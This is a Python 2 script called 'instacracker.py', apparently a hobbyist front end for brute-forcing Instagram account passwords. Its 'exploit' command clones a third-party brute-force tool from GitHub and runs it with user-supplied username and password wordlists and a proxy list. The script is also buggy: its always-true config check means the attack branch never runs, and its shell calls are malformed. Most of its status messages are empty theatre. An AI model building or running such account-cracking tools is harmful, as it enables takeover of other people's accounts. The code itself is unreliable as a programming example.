# (c)opyright 2017 c3blue for the tool's basic platform
# instacracker.py | 2017 & cmb version 0.0.1 & release 0.1

import sys # for idk lmao | optional...
import time # for the tool waiting time...
import os # for processing system updates and git cloning...
import socket # for starting cracker API server...
import requests # for getting url requests and checking internet connection...
import random # for automation in tool...

# defs & vars

setul = '0'
setwl = '0'


def intcheck():
  print 'Importing intcheck-api from Google-CMBApi server...'
  r = requests.get('https://google.com')
  if r.status_code == 200:
    print 'Internet connection successfull...'
  else:
    print 'Internet connection unseccessfull...'
    print 'Error status_code:',r.status_code
    print 'Exiting the script...'
    os.system('exit')

def broadcast(name, parameter):
  bnumber = random.randint(1, 2948323)
  bpara = (parameter)
  print 'Made Broadcast - Name:', name,'Bnumber:',bnumber



# main platform [cmd {insh}]

print '(+) Welcome to instacracker.py'
print '(+) Checking internet connection...'
time.sleep(3)
intcheck()
print '(+) Starting the terminal console...'
while True:
  usrinput = raw_input('InstaCracker:~ MainBase$ ')
  if usrinput == 'help':
    print 'Welcome to InstaCracker Help Box!'
    print 'Here is the list of the commands you can use:'
    print 'help : To show this help box'
    print 'showconfig : Showes the current config'
    print 'setwl : Sets the wordlist file'
    print 'setul : Sets the userlist file'
    print 'exploit : Starts the attack or the cracking'
    print 'exit : Exits the terminal console'
    print 'checkint : Checks the internet connection'
    print 'MORE COMMANDS TO COME!'
  elif usrinput == 'exit':
    print 'Thanks for using InstaCracker!'
    print 'Bye Bye Elite Hacker, Come back later!'
    print 'Please press Control + Z to exit now...'
  elif usrinput == 'checkint':
    print 'Checking internet connection...'
    intcheck()
  elif usrinput == 'showconfig':
    print 'Checking infos...'
    if setul or setwl == '0':
      print 'Please first run setul and setwl before running this command...'
    else:
      print '-------------------------------'
      print '|   Username File:', setul
      print '|   Password File:', setwl
      print '-------------------------------'
  elif usrinput == 'setul':
    setul = raw_input('Enter the exact loction of the usernamelist file: ')
  elif usrinput == 'setwl':
    setwl = raw_input('Enter the exact loction of the passwordlist file: ')
  elif usrinput == 'exploit':
    print 'Checking infos...'
    if setul or setwl == '0':
      print 'Please first run setul and setwl before running this command...'
    else:
      print 'Runnning exploit RBS-CMB v0.0.1 on instagram...'
      print 'Checking if the instagram server is online...'
      r = requests.get('https://www.instagram.com')
      if r.status_code == 200:
        print 'Status:',r.status_code,'IS Online...'
        print 'Injecting exploit...'
        print 'Downloading proxylist...'
        
        print 'Starting to crack...'
        os.system('git clone https://github.com/N3TC4T/InstaBrute instabrute')
        os.system('cd instabrute')
        os.system('python instabrute.py -u',setul,'-w',setwl,'-p proxylist.txt -t 5 -d -v')
      else:
        print 'Please check your internet connection...'
        print 'Exiting now...'
        os.system('exit')
  else:
    print usrinput,'commmand not found...'
    print 'Please type help for a list of commands if you are new to InstaCracker'